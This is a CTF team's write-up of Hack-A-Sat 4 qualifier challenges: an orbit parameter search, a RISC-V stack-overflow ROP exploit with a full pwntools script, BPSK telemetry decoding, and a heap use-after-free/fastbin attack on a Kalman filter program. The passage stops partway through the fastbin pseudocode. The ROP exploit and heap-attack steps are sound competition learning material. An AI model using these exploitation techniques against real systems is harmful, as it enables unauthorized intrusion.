---
title: "Hack-A-Sat 4 Quals - Write ups"
author: "mhackeroni team"
tags: hackasat ctf satellites
---

A collection of some of our writeups for Hack-A-Sat 4 Quals where we achieved 2nd place overall and finals qualification.

Index
-----

- [Contact](#contact) 
- [dROP-Baby](#drop-baby)
- [FAUXY Lady](#fauxy-lady)
- [Kalman At Me Bro](#kalman-at-me-bro)
- [Magic Space Bussin](#magic-space-bussin)
- [You've Been Promoted](#youve-been-promoted)


Contact
-------

### The challenge

**Category:** Anomaly Review Bored

> Billy Bob says he's the best orbit designer there's ever been.
> He designed an orbit with python skyfield that gets 230 minutes of contact on our ground station network.
> Can you beat him?

#### Prompt

Reachable at: `nc contact.quals2023-kah5Aiv9.satellitesabove.me 5300`

```

   _|_|_|    _|_|    _|      _|  _|_|_|_|_|    _|_|      _|_|_|  _|_|_|_|_|
 _|        _|    _|  _|_|    _|      _|      _|    _|  _|            _|
 _|        _|    _|  _|  _|  _|      _|      _|_|_|_|  _|            _|
 _|        _|    _|  _|    _|_|      _|      _|    _|  _|            _|
   _|_|_|    _|_|    _|      _|      _|      _|    _|    _|_|_|      _|


    Billy Bob says he's the best orbit designer there's ever been. He designed an orbit with python skyfield that gets 230 minutes of contact on our ground station network.
    Can you beat him?

    Ground stations are located across the United States at these WGS-84 coordinates:
    Name                 Lat (deg)      Long (deg)       Alt (m)
    Cape Canaveral       28.40         -80.61             27
    Cape Cod             41.70         -70.03              9
    Anchorage            61.21        -149.90             40
    Vandenberg           34.76        -120.52            122
    Denver               39.74        -104.98           1594

    Contact is established at 15 degrees above the horizon and with one ground station at a time.
    Our link budget supports a range of up to 6,000 km.
    Between 1 Apr 2023 00:00:00.000 UTC and 1 Apr 2023 08:00:00.000 UTC, get more hours of contact than Billy Bob.

    Good luck!


Provide your TLE Line 2 parameters.
Inclination (deg):
RAAN (deg):
Eccentricity (x10^-7):
Argument of perigee (deg):
Mean anomaly (deg):
Mean motion (revs/day):
```

#### Description

Positional data about 5 ground stations around the United Stated were given:

```
Name                 Lat (deg)      Long (deg)       Alt (m)
Cape Canaveral       28.40         -80.61             27
Cape Cod             41.70         -70.03              9
Anchorage            61.21        -149.90             40
Vandenberg           34.76        -120.52            122
Denver               39.74        -104.98           1594
```

The challenge asked for six parameters (Inclination, RAAN, Eccentricity,
Argument of perigee, Mean anomaly and Mean motion) to be used for a satellite
orbiting around the Earth, such that the satellite would get >230 minutes of
contact with the ground station network.

The challenge then gives more details about the scenario of the challenge.

* Contact is established at 15 degrees above the horizon and with one ground station at a time.
* The link budget supports a range of up to 6,000 km.
* The time of the orbit to be considered is between 1 Apr 2023 00:00:00.000 UTC and 1 Apr 2023 08:00:00.000 UTC


### Solution

#### Initial idea

As a first idea, we thought of solving the challenge by understanding the
problem and developing a well developed and justified solution.

Well, that didn't happen: here is how we solved this task.

#### First tries

When the challenge was released, some members of our team started sending to the
remote connection random values or random patterns for the six parameters
requested: some tries were worse and some better...

After a few tries, we came up with:

```
Inclination (deg):         45
RAAN (deg):                45
Eccentricity (x10^-7):     0
Argument of perigee (deg): 45
Mean anomaly (deg):        45
Mean motion (revs/day):    15
```

That gave 61 minutes of contact time. Following with:

```
Inclination (deg):         12
RAAN (deg):                10
Eccentricity (x10^-7):     10
Argument of perigee (deg): 10
Mean anomaly (deg):        10
Mean motion (revs/day):    10
```

Which gave a grand total of 105 minutes.

Having some great starting points, almost halfway through the value requested by the challenge, we started to write an **A\* search** using the values in minutes returned by the remote challenge as a heuristic.

The motivation behind the A\* algorithm was to try to slowly improve our best solutions by generating random variations and hoping to get better contact times.

The algorithm works by keeping a **heap** (a queue with the "best" element always at the top) with a lot of inputs to try.
Every cycle, the top element of the heap is popped out and is sent to the remote server. After checking the result in minutes with the best current result, the script generates random variations of that input, and pushes the variations back into the **heap**, weighting them by the result received by the server.

The variation of the inputs is really basic, something like:

```python
rnd = random.randint(1, 63)
new_tuple = [inclination, raan, eccentricity, arg_perigee, mean_anomaly, mean_motion]
for i, bit in enumerate(bin(rnd)[2:].zfill(6)):
    new_tuple[i] = new_tuple[i] + int(bit) * random.randint(-500, 500) * DELTA
```

We first generate a "mask" to choose which elements to change, and then we add some random values to the elements chosen.

#### Improving the results

We got lucky and, while still sending random stuff by hand, we got to:

```
Inclination (deg):         60
RAAN (deg):                10
Eccentricity (x10^-7):     10
Argument of perigee (deg): 10
Mean anomaly (deg):        30
Mean motion (revs/day):    10
```

Which gave an impressive 171 minutes of contact time.

We ran the script starting with that input and (after adjusting the eccentricity
by hand) slowly improved the results, getting timings like 178, ..., 199, ...
and 211 with:

```
Inclination: 115.831300
RAAN: 187.375700
Eccentricity: 1290114.660000
Arg Perigee: 230.202200
Mean Anomaly: 159.298200
Mean Motion: 9.654654
```

Improving from here was getting difficult, and we started writing a local
simulator that would act similar to the remote server, to speed up the A* search
(in the end the simulator wasn't always correct, so we left the scripts
running).

Lowering the `DELTA` in the script, we got some better inputs, such as:

```
Inclination: 114.881300
RAAN: 175.965700
Eccentricity: 1290122.490000
Arg Perigee: 236.002200
Mean Anomaly: 171.928200
Mean Motion: 9.404654
```
With 213 minutes of contact, and:
```
Provide your TLE Line 2 parameters.
Inclination: 107.641800
RAAN: 175.370600
Eccentricity: 1290126.607700
Arg Perigee: 234.187200
Mean Anomaly: 170.385800
Mean Motion: 8.307954
```
With 214 minutes of contact.

#### Final

With a little help from the local tests, we got to the input:

```
Inclination: 117.791300
RAAN: 180.615700
Eccentricity: 2050128.000000
Arg Perigee: 239.192200
Mean Anomaly: 175.058200
Mean Motion: 9.404654
```

Which gave a score of 225, really close! From here, we got to 226 and 227 with
the remote script, until one of our teammates started changing stuff by hand and
got the input:

```
Inclination: 112
RAAN: 175
Eccentricity: 23000000
Arg Perigee: 238
Mean Anomaly: 150
Mean Motion: 9.9
```
Which got a enough time of contact!

### Solution script

One of the (multiple) heuristics solve scripts:

```python
from pwn import *
from skyfield.api import *
from datetime import datetime
from heapq import *
import random
import itertools

PREV_SCORE = 170
DELTA = 0.01

pq = []
heapify(pq)

# here are some random checkpoints from which we started
# heappush(pq, (-PREV_SCORE, 60, 10, 10, 10, 30, 10))
# heappush(pq, (-PREV_SCORE, 60, 10, 1000000, 10, 30, 10))
heappush(pq, (-215.000000, 111.621200, 172.495300, 1290108.581600, 239.212900, 153.050600, 9.571854))
# heappush(pq, (-175.000000, 58.700000, 10.000000, 999992.700000, 9.740000, 28.000000, 14.510000))

while True:
	# connection stuff
	r = remote("contact.quals2023-kah5Aiv9.satellitesabove.me", 5300)
	r.sendlineafter(b"Ticket please:", b"TICKET")

	# read best entry
	score, inclination, raan, eccentricity, arg_perigee, mean_anomaly, mean_motion = heappop(pq)
	print("OLD_SCORE: %f" % score)
	print("Inclination: %f" % inclination)
	print("RAAN: %f" % raan)
	print("Eccentricity: %f" % eccentricity)
	print("Arg Perigee: %f" % arg_perigee)
	print("Mean Anomaly: %f" % mean_anomaly)
	print("Mean Motion: %f" % mean_motion)

	r.sendlineafter(b"Inclination (deg):", str(inclination).encode())
	r.sendlineafter(b"RAAN (deg):", str(raan).encode())
	r.sendlineafter(b"Eccentricity (x10^-7):", str(eccentricity).encode())
	r.sendlineafter(b"Argument of perigee (deg):", str(arg_perigee).encode())
	r.sendlineafter(b"Mean anomaly (deg):", str(mean_anomaly).encode())
	r.sendlineafter(b"Mean motion (revs/day):", str(mean_motion).encode())

	# read new score
	try:
		r.recvuntil(b"Your orbit achieved ")
		line = r.recvline(False).split(b" ", 1)[0]
	except EOFError:
		print("BRUCIA!")
		continue

	new_score = -int(line)
	print("New Score: %d" % new_score)

	# generate random variations, we also used a version of the script which generated 100 variations and didn't use a mask to choose which parameters to change
        # also we had a version with local testing and multithreading :)
	for i in range(10):
		rnd = random.randint(1, 63)
		new_tuple = [inclination, raan, eccentricity, arg_perigee, mean_anomaly, mean_motion]
		for i, bit in enumerate(bin(rnd)[2:].zfill(6)):
			new_tuple[i] = new_tuple[i] + int(bit) * random.randint(-500, 500) * DELTA

		heappush(pq, tuple([new_score] + new_tuple))

	r.close()
```

The local simulation script:

```python
from skyfield.api import load, wgs84
import IPython

'''
Name                 Lat (deg)      Long (deg)       Alt (m)
Cape Canaveral       28.40         -80.61             27
Cape Cod             41.70         -70.03              9
Anchorage            61.21        -149.90             40
Vandenberg           34.76        -120.52            122
Denver               39.74        -104.98           1594
'''

eph = load("de421.bsp")
earth = eph['Earth']

stations = {
    "Cape Canaveral": wgs84.latlon(28.40, -80.61, 27),
    "Cape Cod": wgs84.latlon(41.70,  -70.03, 9),
    "Anchorage": wgs84.latlon(61.21, -149.90, 40),
    "Vandenberg": wgs84.latlon(34.76, -120.52, 122),
    "Denver": wgs84.latlon(39.74, -104.98, 1594),
}

stations_eph = {
    "Cape Canaveral": wgs84.latlon(28.40, -80.61, 27) + earth,
    "Cape Cod": wgs84.latlon(41.70,  -70.03, 9) + earth,
    "Anchorage": wgs84.latlon(61.21, -149.90, 40) + earth,
    "Vandenberg": wgs84.latlon(34.76, -120.52, 122) + earth,
    "Denver": wgs84.latlon(39.74, -104.98, 1594) + earth,
}

secs = {}

ts = load.timescale()
t0 = ts.utc(2023, 4, 1)
t1 = ts.utc(2023, 4, 1, 8)
sat = load.tle_file("tle.txt")[0]
secs = 0;
t = t0
for _ in range (8 * 60):
    t = t + 1/(24*60)
    for k in stations.keys():
        difference = sat - stations[k]
        topocentric = difference.at(t)
        alt, az, distance = topocentric.altaz()
        if distance.km < 300:
            print("BRUCIA")
            exit()
        if alt.degrees > 15 and distance.km < 6000:
            secs += 1
            print(f"{k}: Alt: {alt}, Dist: {distance.km}")
            break

print(f"Total sec: {secs}")
```

dROP-Baby
-------

### The challenge

**Category**: "Pure Pwnage"

**Summary**: Stack overflow which leads to a ROP on RISC-V/32 architecture

#### Description

This is a variation of the Smash-RiscV challenge, but the stack is not marked as executable, and there is a hidden configuration that leads to a stack overflow

> **NOTE**: you should have `gdb-multiarch` and `qemu-riscv32` installed

#### Python Setup

```python
#!/usr/bin/env python3
from pwn import *
import os

exe = ELF("./drop-baby")
context.arch = "riscv"
context.bits = 32

# context.binary = exe

gdbscript = """
file drop-baby
target remote localhost:1234
"""


def start():
    if args.REMOTE:
        io = remote("drop.quals2023-kah5Aiv9.satellitesabove.me", 5300)
        io.sendline(
            "ticket{golf366979sierra4:GHAZFC9h62tmeRLKrH7JlpRnLQFEWH0TU6xmyKtehG8X8rjRbnOSYab8ZO3iwQTkTg}"
        )
    else:
        if args.GDB:
            os.system("tmux splitw -h gdb-multiarch -ex init-gef -x .gdbrun")
        io = process(
            ["qemu-riscv32", "-g", "1234", "drop-baby"],
            env={"FLAG": "flag{REDACTED}", "TIMEOUT": "999999999"},
        )

    return io

io = start()
io.interactive()
```

#### How the binary works

In brief, the binary emulates a satellite that receives a message and sends a response. Firstly, the binary loads the timeout and flag from the environment variables. If the timeout is not present, 10 seconds is set as the default value. If the flag is not present, the program won't start. The main portion of the code comes after, where we can see some configuration being loaded from `server.ini` and a loop that synchronizes the connection and reads a message from it. The `loadINI("server.ini")` function simply reads the `server.ini` file, parses the format, and loads the actual configuration into memory. `synchronize()` function discards all the remaining bytes until it encounters the sequence `\xde\xad\xbe\xef`.

![]({{"/assets/img/has4quals_writeups/drop01.png" | absolute_url}})

Here, we can see the `read_message()` function. In brief, it checks the next byte after `\xde\xad\xbe\xef` and executes different functions depending on the byte that we send. Here is where the configuration is used. These values are actually used to determine the length of the message to be received, which is different depending on the type of message that we are sending ('a1', 'a2', 'b1', 'b2'). Every message has to be of the length specified in the corresponding configuration minus 4 (space left for the `crc32`), and have a `crc32` of the message at the end; otherwise, it shall close the connection. Note that the message is read and written onto the stack, and <u>the maximum space allocated is 100</u>. Since the configuration is not checked a value greater than 100 may lead to an overflow

![]({{"/assets/img/has4quals_writeups/drop02.png" | absolute_url}})


### Solution


The interesting part is that we do not have the `server.ini` file, but we can retrieve it by using the command `b1`. Therefore, we must guess the random configuration for that specific command. To print it, as already mentioned, we have to send a message with the `crc32` appended at the end, with the length specified in the configuration. But since we do not have that file, we can just send `b1` messages with increasing length until the configuration is printed.

![]({{"/assets/img/has4quals_writeups/drop03.png" | absolute_url}})

Here is a simple script to get the `server.ini`

```python
for i in range(0, 0x1000):
    with start() as io:
        # synchronize
        io.send(b"\xde\xad\xbe\xef")

        # print configuration
        io.send(b"\xb1")

        msg = b"?" * i
        msg += p32(zlib.crc32(msg))

        io.send(msg)

        recvd = io.recvall(timeout=2)

        if b"Config Table" in recvd:
            log.success(recvd.decode())
            break
```

```shell
    Baby's Second RISC-V Stack Smash

    No free pointers this time and pwning might be more difficult!
    Exploit me!
             Config Table
    ------------------------------
    |Application Name : Baby dROP|
    |      A1_MSG_LEN : 40       |
    |      A2_MSG_LEN : 10       |
    |      B1_MSG_LEN : 20       |
    |      B2_MSG_LEN : 300      |
    |      CC_MSG_LEN : 25       |
    |      ZY_MSG_LEN : 0        |
    |   SILENT_ERRORS : TRUE     |
    ------------------------------
```

Here we can see that `B2_MSG_LEN` is set to 300. As already mentioned, this leads to a stack overflow since the maximum size for a message should be 100.


![]({{"/assets/img/has4quals_writeups/drop04.png" | absolute_url}})


![]({{"/assets/img/has4quals_writeups/drop05.png" | absolute_url}})

```shell
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$zero: 0x00000000  →  0x00000000
$ra  : 0x62616165  →  0x62616165
$sp  : 0x40800d90  →  0x62616166  →  0x62616166
$gp  : 0x0006ea84  →  0x00000000  →  0x00000000
$tp  : 0x000724e0  →  0x0006dd50  →  0x0006b998  →  0x0004fda4  →  0x00000043  →  0x00000043
$t0  : 0x00000001  →  0x00000001
$t1  : 0x19999999  →  0x19999999
$t2  : 0x00000000  →  0x00000000
$fp  : 0x62616164  →  0x62616164
$s1  : 0x00000001  →  0x00000001
$a0  : 0xffffffff
$a1  : 0x40800d18  →  0x61616161  →  0x61616161
$a2  : 0x00000128  →  0x00000128
$a3  : 0x00002000  →  0x00002000
$a4  : 0xffffffff
$a5  : 0xffffffff
$a6  : 0x00073d03  →  0x00000000  →  0x00000000
$a7  : 0x0000003f  →  0x0000003f
$s2  : 0x00000001  →  0x00000001
$s3  : 0x40800f04  →  0x40800fbe  →  0x706f7264  →  0x706f7264
$s4  : 0x40800f0c  →  0x40800fc8  →  0x454d4954  →  0x454d4954
$s5  : 0x00000001  →  0x00000001
$s6  : 0x00010fca  →  0xde067139  →  0xde067139
$s7  : 0x00010230  →  0xc6061141  →  0xc6061141
$s8  : 0x00000000  →  0x00000000
$s9  : 0x00000000  →  0x00000000
$s10 : 0x00000000  →  0x00000000
$s11 : 0x00000000  →  0x00000000
$t3  : 0x00000009  →  0x00000009
$t4  : 0x00000000  →  0x00000000
$t5  : 0x00054dc4  →  0x00000000  →  0x00000000
$t6  : 0x00000005  →  0x00000005
──────────────────────────────────────────────────────────────────────────────────────────────── code:riscv:RISCV ────
      0x10f9e <do_b2+74>       j      0x10fa2 <do_b2+78>
      0x10fa0 <do_b2+76>       li     a5, 0
      0x10fa2 <do_b2+78>       mv     a0, a5
 →    0x10faa <do_b2+86>       ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x40800d90│+0x0000: 0x62616166  →  0x62616166    ← $sp
0x40800d94│+0x0004: 0x62616167  →  0x62616167
0x40800d98│+0x0008: 0x62616168  →  0x62616168
0x40800d9c│+0x000c: 0x62616169  →  0x62616169
0x40800da0│+0x0010: 0x6261616a  →  0x6261616a
0x40800da4│+0x0014: 0x6261616b  →  0x6261616b
0x40800da8│+0x0018: 0x6261616c  →  0x6261616c
0x40800dac│+0x001c: 0x6261616d  →  0x6261616d
───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x10faa in do_b2 (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x10faa → do_b2(size=0x12c)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

So now we have a stack overflow, and these are the protections

```
[*] '/home/tt3/Workspace/dropbaby/drop-baby'
    Arch:     em_riscv-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

The stack is non-executable, so the only option left is to perform a ROP. What we need is just a call to `puts(flag)`. The flag is stored at a fixed stack address, and `puts()` is also at a fixed address. There is no `ASLR` in this binary. However, the problem is that, unlike the Intel architecture, RiscV/32 passes the arguments in the `a0`, `a1`, and `a2` registers. The `ret` instruction just puts the content of the `ra` register in `pc`. Therefore, what we really need are some gadgets that set `ra` and `a0` based on stack values. Fortunately, there is a single gadget that can enable us to do both at address `0x167D2`.

```
gef➤  x/9i 0x167D2
   0x167d2 <_IO_puts+150>:      lw      ra,28(sp)
   0x167d4 <_IO_puts+152>:      mv      a0,s0
   0x167d6 <_IO_puts+154>:      lw      s0,24(sp)
   0x167d8 <_IO_puts+156>:      lw      s1,20(sp)
   0x167da <_IO_puts+158>:      lw      s2,16(sp)
   0x167dc <_IO_puts+160>:      lw      s3,12(sp)
   0x167de <_IO_puts+162>:      lw      s4,8(sp)
   0x167e0 <_IO_puts+164>:      add     sp,sp,32
   0x167e2 <_IO_puts+166>:      ret
```

Here you can see that this gadget sets `ra` to an value on the stack which we control, and `a0` to `s0`. If we check the value of `s0` we can see that ...

```
──────────────────────────────────────────────────────────────────────────────────────────────── code:riscv:RISCV ────
      0x10f9e <do_b2+74>       j      0x10fa2 <do_b2+78>
      0x10fa0 <do_b2+76>       li     a5, 0
      0x10fa2 <do_b2+78>       mv     a0, a5
 →    0x10faa <do_b2+86>       ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x40800d90│+0x0000: 0x62616166  →  0x62616166    ← $sp
0x40800d94│+0x0004: 0x62616167  →  0x62616167
0x40800d98│+0x0008: 0x62616168  →  0x62616168
0x40800d9c│+0x000c: 0x62616169  →  0x62616169
0x40800da0│+0x0010: 0x6261616a  →  0x6261616a
0x40800da4│+0x0014: 0x6261616b  →  0x6261616b
0x40800da8│+0x0018: 0x6261616c  →  0x6261616c
0x40800dac│+0x001c: 0x6261616d  →  0x6261616d
───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x10faa in do_b2 (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x10faa → do_b2(size=0x12c)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $s0
$1 = (void *) 0x62616164
gef➤

```

... We control it!
Now we can directly jump to this gadget and set the value of `r0` to the address of `puts()` and `a0` to the value of `flag` by modifying the appropriate stack values

> **NOTE**: On the remote server, the stack is a little bit different due to the presence of environment variables. Therefore, the actual address of the flag changes by some offset. We can brute force the offset since we know that it is not large.

### Exploit script

```python
#!/usr/bin/env python3
#
# Usage: ./solve.py REMOTE
#

from pwn import *
import zlib
import os

exe = ELF("./drop-baby")
context.arch = "riscv"
context.bits = 32

# context.binary = exe

gdbscript = """
file drop-baby
target remote localhost:1234
"""


def start():
    if args.REMOTE:
        io = remote("drop.quals2023-kah5Aiv9.satellitesabove.me", 5300)
        io.sendline(
            "ticket{REDACTED}"
        )
    else:
        if args.GDB:
            os.system("tmux splitw -h gdb-multiarch -ex init-gef -x .gdbrun")
        io = process(
            ["qemu-riscv32", "-g", "1234", "drop-baby"],
            env={"FLAG": "flag{REDACTED}", "TIMEOUT": "999999999"},
        )

    return io


APPLICATION_NAME = "Baby dROP"
A1_MSG_LEN = 40
A2_MSG_LEN = 10
B1_MSG_LEN = 20
B2_MSG_LEN = 300
CC_MSG_LEN = 25
ZY_MSG_LEN = 0
SILENT_ERRORS = True


for i in range(0, 0x1000, 6):
    with start() as io:
        # synchronize
        io.send(b"\xde\xad\xbe\xef")

        # b2 msg
        io.send(b"\xb2")

        payload = fit(
            {
                # stack address of the flag
                112: [0x40800FE0 - i],

                # stack address of magic gadget
                116: [0x167D2],

                # puts address
                148: [0x1673C],
            }
        )
        payload = payload.ljust(B2_MSG_LEN - 4, b"X")
        payload += p32(zlib.crc32(payload))

        io.send(payload)

        recvd = io.recvall(timeout=2)

        if b"flag{" in recvd:
            log.success(recvd.decode())
            exit(0)
```

FAUXY Lady
------

### The challenge

**Category**: "Can't Stop the Signal, Mal"

> A university needs your help collecting their cubesat's telemetry. We've captured a .wav recording of the satellite signal and the university has published the telemetry definition. The recorded signal has the following characteristics:
>
> - BPSK modulated
> - Differentially encoded
> - 44.1k samples per second
>
> Can you reconstruct the telemetry packet?

#### Description

The challenge presents to us with a waveform file `signal.wav` and a description that says that the signal is BPSK modulated with a sample rate of `44.1Khz` and differentially encoded.
We were also given the packet specification of this protocol in a pdf file.

### Solution

Our approach started with the analisys of the signal inside GNURadio Companion, we set the sample rate to 44.1Khz, imported the file with a `Wav file source` block and converted it into complex type using a `Float to Complex` block. We then used a `BPSK Demodulator` block guessing the baudrate while also watching the output with a `Time Sink` block. As soon as we set baudrate to `1200` and `Differential` to True we got a nice square wave out. We then exported the bitstream and further processed it Python.

#### Data processing

The challenge description mentioned differential encoding, so the first step we applied was a differential decoder:

```python
for b in bits:
    out.append(b ^ prev)
    prev = b
```

Printing out the resulting bits, we noticed that after the first section where there was some noise, splitting the text in 8 bit chunks only ever produced two bitstrings:

- `00000000`
- `10000001`

We guessed that each of these represented a single bit in the message, and we also knew from the challenge description that the packets we were looking for started with a magic number of `0x1ACFFC1D`. We looked for a bit mapping that contained the magic, and decoded the bitstream, mapping `00000000` to `1` and `10000001` to `0`.

Finally, we extracted the three packets contained in the bitstream and printed their contents, revealing the three parts of the flag.

### Solution scripts

#### Bit mapping

```python
# out.out comes from gnuradio
with open('out.out', 'rb') as fin:
    data = fin.read()

bits = []
for ch in data:
    for b in bin(ch)[2:].rjust(8, '0'):
        bits.append(int(b))

out = []
prev = 0

for b in bits:
    out.append(b ^ prev)
    prev = b

out = ''.join(map(str, out))
msg = ''
for i in range(0, len(out), 8):
    if out[i:i+8] == '00000000': msg += '1'
    else: msg += '0'

print(msg)
```

#### Final decoding

```python
data = [
    '000110101100111111111100000111010000000001100100000000000110010001111110001100010100000101000010001011010100001101000100010001010011001001000110010001110100100001001001001011010011000100000011111100000110011001101100011000010110011101111011011101110110100001101001011100110110101101100101011110010011100100110001001101000011011000110001001110000110110101101001011010110110010100110100001110100100011101001101011110100101011000110101001110000111100101000101011011010100110101110001010011110110011101010000010110100101010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011010011000000101111110111111111',
    '000110101100111111111100000111010000000001100100000000000110010001111110001100010100000101000010001011010100001101000100010001010011001001000110010001110100100001001001001011010011000100000011111100000111011101010010011010100111010101001101011011100110110100110010010100000110100000101101010001110110101100110110010000010100111001000001011011010101100001001010010100010110101001000001001100000100010101101000011011010011000101000101010010000111000001001001001110010100110101001000001100110101010001000111011110100011010100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100011101010101101111110111111111',
    '000110101100111111111100000111010000000001100100000000000110010001111110001100010100000101000010001011010100001101000100010001010011001001000110010001110100100001001001001011010011000100000011111100000100001100110100010010010100001101011000011110000110101101110101001110000100010101001010011010000110101000111001011101010100110001010000010110010011010001101100010000110111000001000100010100000111011101110011011011010100001101101000011100110101100101111101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000101111011001111101111110111111111',
]

for packet in data:
    text = []
    for i in range(0, len(packet), 8):
        v = int(packet[i:i+8], 2)
        text.append(v)
    print(bytes(text))

# flag{whiskey914618mike4:GMzV58yEmMqOgPZTwRjuMnm2Ph-Gk6ANAmXJQjA0Ehm1EHpI9MH3TGz5C4ICXxku8EJhj9uLPY4lCpDPwsmChsY}
```

Kalman At Me Bro
------

### The challenge

**Category**: "Pure Pwnage"

**Sumamry**: Use fastbin attack to modify the covariance matrix of the Kalman Filter employed in the implemented simulation.

#### Description
In this challenge, an Kalman Filter is implemented to estimate the relative position of a satellite with respect to a space station. The estimate is derived from a given set of movements and the position readings coming from a sensor. The objective is to achieve a final estimated relative position that is within 10 meters of the space station along x,y,z axes, with a valid state for the Kalman filter and high confidence on the estimate (small covariance matrix).

### Solution

#### Used types

```c
struct PositionMeasurement {
  uint64_t time;
  uint64_t x;
  uint64_t y;
  uint64_t z;
};

struct PositionUpdate {
  void *vtable;
  _BYTE pad[40];
  _BYTE matrix[144];
  double *variance_arr;
  _BYTE pad2[8];
};

struct Link {
  PositionMeasurement pos;
  struct Link *prev;
  struct Link *next;
};

struct LinkedList {
  Link *head;
  Link *tail;
};

struct User {
  PositionUpdate pos_update;
  LinkedList linked_list;
  _BYTE measurements_vec[40];
};
```

#### Functionalities implemented in the binary

When the binary is started we are greeted with the following menu:
```
1: Add measurement
2: Remove first measurement
3: Remove last measurement
4: List measurements
5: Run simulation
Choice>
```

Internally a struct `User` is created, this will be used throughout the program:
```c

int main(int argc, const char **argv) {
  ...
  User::User(&user)
  ...
}

void User::User(User *this) {
  PositionUpdate::PositionUpdate(&this->pos_update);
  LinkedList<PositionMeasurement>::LinkedList(&this->linked_list);
  std::vector<AccelerationMeasurement,std::allocator<AccelerationMeasurement>>::vector(this->measurements_vec);
  User::loadAccels(this);
  User::loadPositions(this);
  PositionUpdate::setVariance(&this->pos_update, 100.0, 100.0, 100.0, 10.0, 10.0, 10.0);
}
```

##### `1: Add measurement`

When we add a measurement we are asked for X,Y,Z and the time:
```
1: Add measurement
2: Remove first measurement
3: Remove last measurement
4: List measurements
5: Run simulation
Choice>
1
Enter new measurement. X,Y,Z are uint64 fixed point numbers. Time is usec counts.
Time (US)>
10
X>
20
Y>
30
Z>
40
```

From these values a `PositionMeasurement` struct is created and then added to the linked list `linked_list` of the user struct.
```c
unsigned __int64 User::addMeasurement(User *this) {
  ...
  LinkedList<PositionMeasurement>::addBack(&this->linked_list, &measurement);
  ...
}
```

##### `2: Remove first measurement`

Option 2 allows us to remove the first element from the head of the linked list (`linked_list`):

```c
void LinkedList<PositionMeasurement>::popFront(LinkedList *list) {
  Link *head;

  head = list->head;
  if (list->head) {
    list->head = list->head->next;
    if (list->head)
      list->head->prev = NULL;
    if (head)
      operator delete(head);
  }
}
```


##### `3: Remove last measurement`

Option 3 allows us to remove the first element from the tail of the linked list (`linked_list`):

```c
void LinkedList<PositionMeasurement>::popBack(LinkedList *list) {
  Link *cur;

  cur = list->tail;
  if (cur) {
    list->tail = list->tail->prev;
    if (list->tail)
      list->tail->next = NULL;
    cur->next = NULL;
    cur->prev = NULL;
    if (cur)
      operator delete(cur);
  }
}
```


##### `4: List measurements`

Option 4 allows us to list all the measurements and print their values (time, x, y, z).

```c
void User::listMeasurement(User *this) {
  bool is_not_null;
  unsigned __int64 i;
  Link *pos_measurement;

  is_not_null = 1;
  i = 0;
  puts(" Time (us), X, Y, Z");
  while (is_not_null) {
    pos_measurement = LinkedList<PositionMeasurement>::getIndex(&this->linked_list, i);
    if ( pos_measurement )
      User::printMeasurment(this, i, &pos_measurement->pos);
    ++i;
    is_not_null = (pos_measurement != NULL);
  }
}
```

#### Kalman Filters Explained

Kalman filters are used to estimate the position of an object, combining the
effect of measurements by sensors and the commands that are given to actuators.
In this case, the filter receives information from two sources: acceleration
readings and position readings. The accelerations are constant between
executions and we have no control over them. On the other hand, we can influence
the state of the kalman filter as we have control on the position readings.

Both positions and accelerations are three-dimensional with an associated
timestamp. The simulation loop steps forward in time from one acceleration
reading to the next, terminating after they are finished. Before applying the
effect of the acceleration, the program checks if the next position in the list
of readings has a timestamp lower than the acceleration that is about to be
processed, in that case, the state of the filter is updated with the information
provided by the positional reading, then propagated to the timestamp of the
acceleration. At that point, the acceleration is applied to the filter and the
simulation continues.

As we have control on the positional readings, we can feed fake measurements to
the filter to bring the estimate close to the station, however, the accuracy of
the sensor is too low to allow us to steer the estimate to the position we need
with sufficient accuracy (the magnitude of the covariance matrix describing the
sensor is too high)


#### Vulnerability

The struct `LinkedList linked_list` holds a pointer to the head and the tail of
the linked list. When using option 2 and 3 the elements of the linked lists are
freed and removed starting from the head or the tail. When the list only
contains one element, `head` and `tail` both point to the same `Link` struct.
When removing the head or the tail from such linked list the other pointer is
not updated and this will later cause a uaf/double free.

Example:

```
head = A
tail = A
```

If now we pop from the front:

```
head = NULL
tail = A
```

tail now points to a freed `Link` struct. (a pop back now would cause a double free).

Similarly if we pop from the back:

```
head = A
tail = NULL
```

head now points to a freed `Link` struct (a pop front now would cause a double free).

When printing the linked list the list is walked starting from the head pointer,
so to get an info leak we want this case:

```
head = A
tail = NULL
```

Using these primitives we used a fastbin attack to obtain an arbitrary write on the heap

#### Fastbin attack pseudocode

```python
# The list initially has 11 elements
# remove them all starting from the tail of the linked list
for _ in range(11):
    remove_last_measurement()

# At this point the head pointer is freed, we can get an heap leak
heap_leak = list_measurements()[0][0]

# This add will overewrite the UAFd head,
# fixing the list
add_measurement(0x1337, 0, 0, 0)
# List : A <-> A, and 6 elements in 0x40 tcache

# Drain tcache
for i in range(8):
    add_measurement(u64(p8(0x41+i)*8), 0, 0, 0)

# Fill tcache
for _ in range(8):
    remove_last_measurement()
# List: A <-> A, and 0x40 tcache is full

